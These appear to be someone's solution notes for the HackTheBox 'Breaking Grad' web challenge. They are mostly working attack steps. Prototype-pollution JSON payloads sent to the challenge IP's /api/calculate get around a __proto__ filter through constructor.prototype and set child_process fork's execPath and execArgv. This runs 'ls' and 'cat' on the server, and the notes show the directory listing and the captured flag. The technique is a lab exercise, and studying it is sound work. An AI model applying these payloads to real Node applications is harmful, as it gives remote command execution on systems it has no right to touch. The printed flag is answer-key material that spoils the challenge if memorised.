#https://d4rkstat1c.medium.com/breaking-grad-hackthebox-write-up-9e780ff2b68b
#https://y3a-github-io.translate.goog/2021/06/15/htb-breaking-grad/?_x_tr_sl=en&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=sc

#const { execSync, fork } = require('child_process');
#Even though the word __proto__ is filtered, constructor.prototype will refer to the same thing.
#fork function accepts an execPath and execArgv arguments.

'''

Postman
POST http://134.122.104.91:31487/api/calculate
{"constructor": {"prototype": {"execPath": "ls", "execArgv": ["-la", "."]}}}

GET http://134.122.104.91:31487/debug/version
-rw-r--r-- 1 root root  318 Jun 26  2020 VersionCheck.js

.:
total 64
drwxr-xr-x  1 root root  4096 Jun 26  2020 .
drwxr-xr-x  1 root root  4096 Apr 15 01:50 ..
-rw-r--r--  1 root root    32 Jun 26  2020 .gitignore
-rw-r--r--  1 root root   318 Jun 26  2020 VersionCheck.js
-rw-r--r--  1 root root    43 Jun 26  2020 flag_e1T6f
drwxr-xr-x  2 root root  4096 Jun 26  2020 helpers
-rw-r--r--  1 root root   490 Jun 26  2020 index.js
drwxr-xr-x 56 root root  4096 Jun 26  2020 node_modules
-rw-r--r--  1 root root 14241 Jun 26  2020 package-lock.json
-rw-r--r--  1 root root   409 Jun 26  2020 package.json
drwxr-xr-x  2 root root  4096 Jun 26  2020 routes
drwxr-xr-x  5 root root  4096 Jun 26  2020 static
drwxr-xr-x  2 root root  4096 Jun 26  2020 views

POST http://134.122.104.91:31487/api/calculate
{"constructor": {"prototype": {"execPath": "cat", "execArgv": ["flag_e1T6f"]}}}

GET http://134.122.104.91:31487/debug/version
HTB{l00s1ng_t3nur3_l1k3_it5_fr1d4y_m0rn1ng}const package = require('./package.json');
const nodeVersion = process.version;

if (package.nodeVersion == nodeVersion) {
    console.log(`Everything is OK (${package.nodeVersion} == ${nodeVersion})`);
}else{
    console.log(`You are using a different version of nodejs (${package.nodeVersion} != ${nodeVersion})`);
}

'''
